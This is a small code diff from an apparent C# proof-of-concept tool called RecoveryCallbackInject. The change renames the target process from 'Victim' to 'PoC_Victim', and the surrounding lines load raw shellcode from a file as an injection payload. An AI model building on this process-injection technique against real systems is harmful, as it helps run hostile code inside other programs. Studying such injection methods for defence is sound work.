@@ -23,7 +23,7 @@ namespace RecoveryCallbackInject
 				Environment.Exit(0);
 			}
 
-			string processName = "Victim"; //name of process to query for Recovery callbacks. 
+			string processName = "PoC_Victim"; //name of process to query for Recovery callbacks. 
 			byte[] payload = File.ReadAllBytes(args[0]); //Convert the contents of a file of raw shellcode to a byte array
 
 
